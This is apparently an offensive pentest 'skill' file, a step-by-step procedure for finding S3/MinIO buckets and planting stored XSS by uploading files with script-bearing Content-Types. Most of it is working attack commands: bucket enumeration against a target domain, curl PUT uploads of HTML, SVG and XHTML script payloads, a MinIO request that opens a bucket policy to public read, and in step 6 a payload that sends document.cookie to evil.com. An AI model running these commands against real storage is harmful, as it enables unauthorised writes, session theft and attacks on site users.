---
name: s3-minio-xss
description: S3/MinIO Content-Type stored XSS via bucket upload
version: 1.0.0
phase: recon
category: discovery
tags: [s3, minio, xss, content-type, cloud]
tools: [curl]
difficulty: advanced
opsec_level: medium
time_estimate: 5m
severity_if_found: high
related_skills:
  - hardcoded-credentials
mitre_attack:
  - T1189
---

## When to Use

- Target uses S3-compatible storage (AWS S3, MinIO, DigitalOcean Spaces)
- Public bucket found with upload capability
- Testing stored XSS via Content-Type header injection

## Prerequisites

- curl installed
- S3 bucket URL or MinIO endpoint discovered

## Procedure

### 1. Discover S3/MinIO Buckets

```bash
for bucket in assets static files uploads media content cdn; do
  for domain in TARGET.com s3.amazonaws.com; do
    STATUS=$(curl -sI "https://$bucket.$domain/" -o /dev/null -w "%{http_code}")
    [ "$STATUS" != "404" ] && echo "BUCKET: $bucket.$domain ($STATUS)"
  done
done
```

### 2. Check Bucket Permissions

```bash
curl -s "https://BUCKET_URL/?list-type=2" | python3 -m xml.dom.minidom 2>/dev/null
curl -sI "https://BUCKET_URL/" | grep -i "x-amz-acl\|x-amz-owner"
```

### 3. Content-Type XSS Upload

```bash
# HTML Content-Type
curl -X PUT "https://BUCKET_URL/xss_test.html" \
  -H "Content-Type: text/html" \
  -d '<script>alert(document.domain)</script>'

# SVG with embedded script
curl -X PUT "https://BUCKET_URL/xss_test.svg" \
  -H "Content-Type: image/svg+xml" \
  -d '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'

# XHTML with script
curl -X PUT "https://BUCKET_URL/xss_test.xhtml" \
  -H "Content-Type: application/xhtml+xml" \
  -d '<?xml version="1.0"?><!DOCTYPE html><html><body><script>alert(1)</script></body></html>'
```

### 4. Verify XSS Execution

```bash
curl -sI "https://BUCKET_URL/xss_test.html" | grep -i "content-type"
curl -sI "https://BUCKET_URL/xss_test.html" | grep -i "content-security-policy"
```

### 5. MinIO-Specific Exploitation

```bash
curl -sI "https://TARGET:9001/" | head -5
curl -s "https://TARGET:9001/minio/login" | head -20

# Test MinIO bucket policy
curl -X PUT "https://TARGET:9001/BUCKET/policy" \
  -H "Content-Type: application/json" \
  -d '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":["*"]},"Action":["s3:GetObject"],"Resource":["arn:aws:s3:::BUCKET/*"]}]}'
```

### 6. Cross-Bucket Propagation

```bash
curl -X PUT "https://BUCKET_URL/cross-origin-test.html" \
  -H "Content-Type: text/html" \
  -d '<script>fetch("https://evil.com/?cookie="+document.cookie)</script>'
curl -s "https://TARGET/" | grep -o "https://BUCKET[^\"']*"
```

## OPSEC Rules

- Only upload test files, never actual malicious payloads
- Document bucket name, URL, and permissions found
- Do NOT exfiltrate data via XSS during recon
- Clean up test files after verification (if possible)

## Verification

```bash
curl -sI "https://BUCKET_URL/xss_test.html" | head -3
```

## Pitfalls

- Most S3 buckets block public write — test with `--request-header "x-amz-acl: public-read"`
- MinIO default config often has public access — check `MINIO_ROOT_USER`/`MINIO_ROOT_PASSWORD`
- Some CDNs strip Content-Type from S3 responses
- Bucket policies may block specific Content-Types

## Output Format

```json
{
  "target": "BUCKET_URL",
  "bucket_type": "s3|minio|digitalocean",
  "permissions": {"read": true, "write": true, "list": false},
  "xss_possible": true,
  "content_type_bypass": "text/html",
  "severity": "high"
}
```
